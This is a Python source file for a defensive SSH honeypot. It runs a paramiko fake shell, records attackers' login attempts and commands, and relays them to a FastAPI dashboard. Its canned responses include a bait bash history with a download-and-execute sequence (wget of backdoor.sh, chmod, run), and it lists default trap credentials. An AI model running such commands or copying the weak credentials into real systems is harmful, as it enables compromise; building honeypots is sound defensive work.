# ==============================================================
#  HONEYPOT BACKEND — server.py
#  SSH Honeypot + FastAPI REST + WebSocket real-time relay
# ==============================================================

import asyncio
import csv
import io
import json
import os
import socket
import threading
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from collections import defaultdict

import paramiko
from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, StreamingResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# ── Configuration ────────────────────────────────────────────
SSH_PORT = 2222
HTTP_PORT = 3000
FAKE_HOSTNAME = "prod-db-01"
FAKE_BANNER = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"

ALLOWED_CREDS = [
    ("root", "root"),
    ("admin", "admin"),
    ("root", "toor"),
    ("root", "123456"),
    ("ubuntu", "ubuntu"),
    ("test", "test"),
]

# ── In-Memory Data Store ─────────────────────────────────────
class HoneypotStore:
    def __init__(self):
        self.attempts = []        # list of dicts
        self.commands = []        # list of dicts
        self.active_sessions = {} # session_id → {ip, username, started}
        self.blocked_ips = set()
        self.unique_ips = set()
        self.lock = threading.Lock()

    def add_attempt(self, ip, username, password, method="password", success=False):
        entry = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "ip": ip,
            "username": username,
            "password": password,
            "method": method,
            "success": success,
        }
        with self.lock:
            self.attempts.append(entry)
            self.unique_ips.add(ip)
        return entry

    def add_command(self, ip, username, command):
        entry = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "ip": ip,
            "username": username,
            "command": command,
        }
        with self.lock:
            self.commands.append(entry)
        return entry

    def add_session(self, session_id, ip, username, transport):
        with self.lock:
            self.active_sessions[session_id] = {
                "ip": ip,
                "username": username,
                "started": datetime.now(timezone.utc).isoformat(),
                "transport": transport,
            }

    def remove_session(self, session_id):
        with self.lock:
            self.active_sessions.pop(session_id, None)

    def block_ip(self, ip):
        self.blocked_ips.add(ip)
        # Close active sessions from this IP
        to_remove = []
        with self.lock:
            for sid, sess in self.active_sessions.items():
                if sess["ip"] == ip:
                    try:
                        sess["transport"].close()
                    except Exception:
                        pass
                    to_remove.append(sid)
            for sid in to_remove:
                self.active_sessions.pop(sid, None)

    def unblock_ip(self, ip):
        self.blocked_ips.discard(ip)

    def top_n(self, field, n=10):
        freq = defaultdict(int)
        for a in self.attempts:
            freq[a[field]] += 1
        return sorted(freq.items(), key=lambda x: -x[1])[:n]

    def attempts_over_time(self):
        buckets = defaultdict(int)
        for a in self.attempts:
            minute = a["timestamp"][:16]
            buckets[minute] += 1
        return [{"time": k[11:], "count": v} for k, v in sorted(buckets.items())]

    def get_stats(self):
        return {
            "totalAttempts": len(self.attempts),
            "uniqueIPs": len(self.unique_ips),
            "activeConnections": len(self.active_sessions),
        }

    def snapshot(self):
        return {
            "attempts": self.attempts[-500:],
            "commands": self.commands[-500:],
            "stats": self.get_stats(),
            "topUsernames": [{"value": v, "count": c} for v, c in self.top_n("username")],
            "topPasswords": [{"value": v, "count": c} for v, c in self.top_n("password")],
            "topIPs": [{"value": v, "count": c} for v, c in self.top_n("ip")],
            "attemptsOverTime": self.attempts_over_time(),
            "blockedIPs": list(self.blocked_ips),
        }


store = HoneypotStore()

# ── WebSocket Manager ────────────────────────────────────────
class ConnectionManager:
    def __init__(self):
        self.connections: list[WebSocket] = []

    async def connect(self, ws: WebSocket):
        await ws.accept()
        self.connections.append(ws)

    def disconnect(self, ws: WebSocket):
        self.connections.remove(ws)

    async def broadcast(self, event: str, data: dict):
        message = json.dumps({"event": event, "data": data})
        dead = []
        for ws in self.connections:
            try:
                await ws.send_text(message)
            except Exception:
                dead.append(ws)
        for ws in dead:
            try:
                self.connections.remove(ws)
            except ValueError:
                pass


ws_manager = ConnectionManager()

# We need an event loop reference to schedule broadcasts from SSH threads
main_loop: asyncio.AbstractEventLoop = None


def schedule_broadcast(event, data):
    """Schedule a broadcast from a non-async (SSH) thread."""
    global main_loop
    if main_loop:
        asyncio.run_coroutine_threadsafe(ws_manager.broadcast(event, data), main_loop)


# ── Fake Shell Responses ─────────────────────────────────────
def fake_response(command, user):
    cmd = command.strip().lower()
    responses = {
        "whoami": user,
        "id": f"uid=0({user}) gid=0({user}) groups=0({user})",
        "pwd": "/root",
        "ls": "Desktop  Documents  Downloads  .bash_history  .ssh  .profile",
        "ls -la": (
            f"total 32\n"
            f"drwx------  5 {user} {user} 4096 Oct 14 10:23 .\n"
            f"drwxr-xr-x  3 root root 4096 Sep  1 08:00 ..\n"
            f"-rw-------  1 {user} {user}  220 Sep  1 08:00 .bash_history\n"
            f"-rw-r--r--  1 {user} {user} 3526 Sep  1 08:00 .bashrc\n"
            f"drwx------  2 {user} {user} 4096 Sep 15 12:00 .ssh\n"
            f"drwxr-xr-x  2 {user} {user} 4096 Oct 10 09:15 Desktop\n"
            f"drwxr-xr-x  2 {user} {user} 4096 Oct 10 09:15 Documents"
        ),
        "uname -a": "Linux prod-db-01 5.15.0-83-generic #92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 GNU/Linux",
        "uname": "Linux",
        "hostname": FAKE_HOSTNAME,
        "ifconfig": (
            "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
            "        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255\n"
            "        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)"
        ),
        "ip addr": (
            "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n"
            "    inet 127.0.0.1/8 scope host lo\n"
            "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n"
            "    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0"
        ),
        "cat /etc/passwd": (
            "root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
            "mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n"
            "sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin"
        ),
        "cat /etc/shadow": "cat: /etc/shadow: Permission denied",
        "ps aux": (
            "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
            "root         1  0.0  0.1 169444  9520 ?        Ss   08:00   0:02 /sbin/init\n"
            "root       412  0.0  0.0  72308  5488 ?        Ss   08:00   0:00 /usr/sbin/sshd -D\n"
            "mysql      587  0.1  1.2 1254312 98456 ?       Sl   08:00   0:15 /usr/sbin/mysqld\n"
            "www-data   623  0.0  0.3 274852 28436 ?        S    08:00   0:01 apache2 -k start"
        ),
        "netstat -tlnp": (
            "Active Internet connections (only servers)\n"
            "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program\n"
            "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      412/sshd\n"
            "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      623/apache2\n"
            "tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      587/mysqld"
        ),
        "cat .bash_history": (
            "mysql -u root -p\n"
            "cd /var/www/html\n"
            "ls -la\n"
            "cat config.php\n"
            "wget http://10.0.0.5/backdoor.sh\n"
            "chmod +x backdoor.sh\n"
            "./backdoor.sh"
        ),
        "cat /etc/os-release": (
            'NAME="Ubuntu"\n'
            'VERSION="22.04.3 LTS (Jammy Jellyfish)"\n'
            "ID=ubuntu\n"
            'PRETTY_NAME="Ubuntu 22.04.3 LTS"'
        ),
        "uptime": " 10:23:45 up 43 days,  2:23,  1 user,  load average: 0.08, 0.03, 0.01",
        "df -h": (
            "Filesystem      Size  Used Avail Use% Mounted on\n"
            "/dev/sda1        50G   12G   35G  26% /\n"
            "tmpfs           2.0G     0  2.0G   0% /dev/shm\n"
            "/dev/sda2       200G   89G  101G  47% /var/lib/mysql"
        ),
        "free -m": (
            "              total        used        free      shared  buff/cache   available\n"
            "Mem:           7982        2156        3891         124        1935        5442\n"
            "Swap:          2048           0        2048"
        ),
        "env": (
            f"SHELL=/bin/bash\nUSER={user}\n"
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
            "HOME=/root\nLANG=en_US.UTF-8\nTERM=xterm-256color"
        ),
    }

    if cmd in responses:
        return responses[cmd]
    if cmd.startswith("cd "):
        return ""
    if cmd.startswith("echo "):
        return command[5:]
    if cmd.startswith("cat "):
        return f"cat: {command[4:]}: No such file or directory"
    if cmd.startswith("ls "):
        return responses["ls"]
    if cmd.startswith("wget ") or cmd.startswith("curl "):
        return f"Connecting to {command.split()[1]}... failed: Connection timed out."
    if cmd.startswith("ping "):
        target = command.split()[1] if len(command.split()) > 1 else "0.0.0.0"
        return f"PING {target}: 56 data bytes\n64 bytes: icmp_seq=0 ttl=56 time=11.6 ms\n--- {target} ping statistics ---\n1 packets transmitted, 1 received"
    if cmd.startswith("mkdir ") or cmd.startswith("touch "):
        return ""
    return f"bash: {command.split()[0]}: command not found"


# ── Paramiko SSH Server Interface ─────────────────────────────
class HoneypotSSHInterface(paramiko.ServerInterface):
    def __init__(self, client_ip, session_id, transport):
        self.client_ip = client_ip
        self.session_id = session_id
        self.transport = transport
        self.username = None
        self.exec_mode = False  # True when client uses exec_command instead of shell
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        self.username = username
        success = (username, password) in ALLOWED_CREDS
        entry = store.add_attempt(self.client_ip, username, password, "password", success)

        # Broadcast to dashboard
        schedule_broadcast("new_attempt", entry)
        schedule_broadcast("stats", store.get_stats())
        schedule_broadcast("top_usernames", [{"value": v, "count": c} for v, c in store.top_n("username")])
        schedule_broadcast("top_passwords", [{"value": v, "count": c} for v, c in store.top_n("password")])
        schedule_broadcast("top_ips", [{"value": v, "count": c} for v, c in store.top_n("ip")])
        schedule_broadcast("attempts_over_time", store.attempts_over_time())

        if success:
            print(f"  [AUTH] OK {self.client_ip} - {username}:{password}")
            return paramiko.AUTH_SUCCESSFUL
        else:
            print(f"  [AUTH] FAIL {self.client_ip} - {username}:{password}")
            return paramiko.AUTH_FAILED

    def check_auth_none(self, username):
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_shell_request(self, channel):
        self.exec_mode = False
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pxwidth, pxheight, modes):
        return True

    def check_channel_exec_request(self, channel, command):
        self.exec_mode = True
        self.event.set()
        # Decode and log exec commands
        try:
            cmd_str = command.decode("utf-8", errors="ignore") if isinstance(command, bytes) else str(command)
            print(f"  [EXEC] {self.client_ip} -> {cmd_str}")
            cmd_entry = store.add_command(self.client_ip, self.username or "unknown", cmd_str)
            schedule_broadcast("new_command", cmd_entry)

            # Send fake response through the channel in a thread
            response = fake_response(cmd_str, self.username or "root")
            def send_exec_response():
                try:
                    time.sleep(0.05)
                    if response:
                        channel.sendall((response + "\n").encode("utf-8"))
                    channel.send_exit_status(0)
                    channel.close()
                except Exception:
                    pass
            threading.Thread(target=send_exec_response, daemon=True).start()
        except Exception as e:
            print(f"  [EXEC] Error: {e}")
        return True


def handle_ssh_client(client_sock, client_addr):
    """Handle a single SSH client connection in its own thread."""
    client_ip = client_addr[0]
    session_id = str(uuid.uuid4())

    if client_ip in store.blocked_ips:
        print(f"  [BLOCK] Rejected blocked IP: {client_ip}")
        client_sock.close()
        return

    transport = None
    try:
        transport = paramiko.Transport(client_sock)
        transport.local_version = FAKE_BANNER

        # Load or generate host key
        key_path = Path(__file__).parent / "host_key"
        if not key_path.exists():
            key = paramiko.RSAKey.generate(2048)
            key.write_private_key_file(str(key_path))
            print("[+] Generated SSH host key")
        else:
            key = paramiko.RSAKey(filename=str(key_path))

        transport.add_server_key(key)

        server_interface = HoneypotSSHInterface(client_ip, session_id, transport)

        try:
            transport.start_server(server=server_interface)
        except paramiko.SSHException:
            print(f"  [SSH] Negotiation failed with {client_ip}")
            return
        except EOFError:
            print(f"  [SSH] Connection reset by {client_ip}")
            return

        channel = transport.accept(30)
        if channel is None:
            print(f"  [SSH] No channel from {client_ip}")
            return

        # Register session
        store.add_session(session_id, client_ip, server_interface.username, transport)
        schedule_broadcast("connection_opened", {
            "sessionId": session_id,
            "ip": client_ip,
            "username": server_interface.username,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        schedule_broadcast("stats", store.get_stats())

        server_interface.event.wait(10)
        if not server_interface.event.is_set():
            print(f"  [SSH] Client {client_ip} never requested shell")
            return

        # For exec_command requests, the response is already handled in
        # check_channel_exec_request. Each exec_command opens a new channel,
        # so we loop to accept additional channels until the transport closes.
        if server_interface.exec_mode:
            try:
                channel.recv_exit_status()
            except Exception:
                pass
            # Accept subsequent exec_command channels
            while transport.is_active():
                try:
                    next_channel = transport.accept(10)
                    if next_channel is None:
                        break
                    # Wait for exec to finish on this channel
                    try:
                        next_channel.recv_exit_status()
                    except Exception:
                        pass
                except Exception:
                    break
            return

        user = server_interface.username or "root"

        # Interactive shell mode — send fake banner
        channel.send(f"\r\nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-83-generic x86_64)\r\n")
        channel.send(f"\r\nLast login: {datetime.now(timezone.utc).strftime('%a %b %d %H:%M:%S %Y')} from 10.0.0.1\r\n")
        channel.send(f"{user}@{FAKE_HOSTNAME}:~$ ")

        cmd_buffer = ""
        while True:
            try:
                data = channel.recv(1024)
                if not data:
                    break

                text = data.decode("utf-8", errors="ignore")

                for char in text:
                    if char in ("\r", "\n"):
                        command = cmd_buffer.strip()
                        cmd_buffer = ""

                        if command:
                            print(f"  [CMD] {client_ip} -> {command}")
                            cmd_entry = store.add_command(client_ip, user, command)
                            schedule_broadcast("new_command", cmd_entry)

                            if command.lower() in ("exit", "logout", "quit"):
                                channel.send("\r\nlogout\r\n")
                                channel.close()
                                return

                            response = fake_response(command, user)
                            if response:
                                for line in response.split("\n"):
                                    channel.send(f"\r\n{line}")

                        channel.send(f"\r\n{user}@{FAKE_HOSTNAME}:~$ ")

                    elif char in ("\x7f", "\x08"):  # backspace
                        if cmd_buffer:
                            cmd_buffer = cmd_buffer[:-1]
                            channel.send("\b \b")
                    elif char == "\x03":  # Ctrl+C
                        cmd_buffer = ""
                        channel.send(f"^C\r\n{user}@{FAKE_HOSTNAME}:~$ ")
                    elif char == "\x04":  # Ctrl+D
                        channel.send("\r\nlogout\r\n")
                        channel.close()
                        return
                    elif ord(char) >= 32:  # printable
                        cmd_buffer += char
                        channel.send(char)

            except socket.timeout:
                continue
            except Exception:
                break

    except Exception as e:
        print(f"  [ERR] {client_ip}: {e}")
    finally:
        store.remove_session(session_id)
        schedule_broadcast("connection_closed", {
            "sessionId": session_id,
            "ip": client_ip,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        schedule_broadcast("stats", store.get_stats())
        if transport:
            try:
                transport.close()
            except Exception:
                pass


def run_ssh_server():
    """Run the SSH honeypot server in its own thread."""
    # Ensure host key exists
    key_path = Path(__file__).parent / "host_key"
    if not key_path.exists():
        key = paramiko.RSAKey.generate(2048)
        key.write_private_key_file(str(key_path))
        print("[+] Generated SSH host key")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", SSH_PORT))
    sock.listen(100)
    print(f"\n{'='*50}")
    print(f"  [HONEYPOT] SSH SERVER")
    print(f"  Listening on port {SSH_PORT}")
    print(f"  Trap creds: root/root, admin/admin, root/toor ...")
    print(f"{'='*50}\n")

    while True:
        try:
            client_sock, client_addr = sock.accept()
            client_sock.settimeout(60)
            print(f"[SSH] Connection from {client_addr[0]}:{client_addr[1]}")
            t = threading.Thread(
                target=handle_ssh_client,
                args=(client_sock, client_addr),
                daemon=True,
            )
            t.start()
        except Exception as e:
            print(f"[SSH] Accept error: {e}")


# ── FastAPI Application ──────────────────────────────────────
@asynccontextmanager
async def lifespan(application):
    global main_loop
    main_loop = asyncio.get_event_loop()
    ssh_thread = threading.Thread(target=run_ssh_server, daemon=True)
    ssh_thread.start()
    print("[*] SSH honeypot thread started")
    yield

app = FastAPI(title="Honeypot Dashboard API", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Serve frontend static files
frontend_dir = Path(__file__).parent / "frontend"
if frontend_dir.exists():
    app.mount("/static", StaticFiles(directory=str(frontend_dir)), name="static")


@app.get("/")
async def serve_dashboard():
    index_path = frontend_dir / "index.html"
    if index_path.exists():
        return FileResponse(str(index_path))
    return JSONResponse({"error": "Frontend not found"}, status_code=404)


@app.get("/api/state")
async def get_state():
    return JSONResponse(store.snapshot())


@app.post("/api/block")
async def block_ip(body: dict):
    ip = body.get("ip")
    if not ip:
        return JSONResponse({"error": "IP required"}, status_code=400)
    store.block_ip(ip)
    await ws_manager.broadcast("ip_blocked", {"ip": ip, "timestamp": datetime.now(timezone.utc).isoformat()})
    await ws_manager.broadcast("stats", store.get_stats())
    return JSONResponse({"success": True, "ip": ip})


@app.post("/api/unblock")
async def unblock_ip(body: dict):
    ip = body.get("ip")
    if not ip:
        return JSONResponse({"error": "IP required"}, status_code=400)
    store.unblock_ip(ip)
    await ws_manager.broadcast("ip_unblocked", {"ip": ip, "timestamp": datetime.now(timezone.utc).isoformat()})
    return JSONResponse({"success": True, "ip": ip})


@app.get("/api/export/csv")
async def export_csv():
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["timestamp", "ip", "username", "password", "success"])
    for a in store.attempts:
        writer.writerow([a["timestamp"], a["ip"], a["username"], a["password"], a["success"]])

    output.seek(0)
    return StreamingResponse(
        iter([output.getvalue()]),
        media_type="text/csv",
        headers={"Content-Disposition": f"attachment; filename=honeypot_report_{int(time.time())}.csv"},
    )


@app.get("/api/export/json")
async def export_json():
    data = {
        "exportedAt": datetime.now(timezone.utc).isoformat(),
        **store.snapshot(),
    }
    content = json.dumps(data, indent=2)
    return StreamingResponse(
        iter([content]),
        media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename=honeypot_report_{int(time.time())}.json"},
    )


@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    await ws_manager.connect(ws)
    print(f"[WS] Dashboard client connected")
    try:
        # Send initial state
        await ws.send_text(json.dumps({"event": "initial_state", "data": store.snapshot()}))
        while True:
            # Keep connection alive; handle pings
            data = await ws.receive_text()
            if data == "ping":
                await ws.send_text(json.dumps({"event": "pong", "data": {}}))
    except WebSocketDisconnect:
        print("[WS] Dashboard client disconnected")
        ws_manager.disconnect(ws)
    except Exception:
        ws_manager.disconnect(ws)


# ── Run ──────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\n" + "=" * 50)
    print("  [DASHBOARD] HONEYPOT DASHBOARD SERVER")
    print(f"  http://localhost:{HTTP_PORT}")
    print("=" * 50 + "\n")
    uvicorn.run(app, host="0.0.0.0", port=HTTP_PORT, log_level="warning")
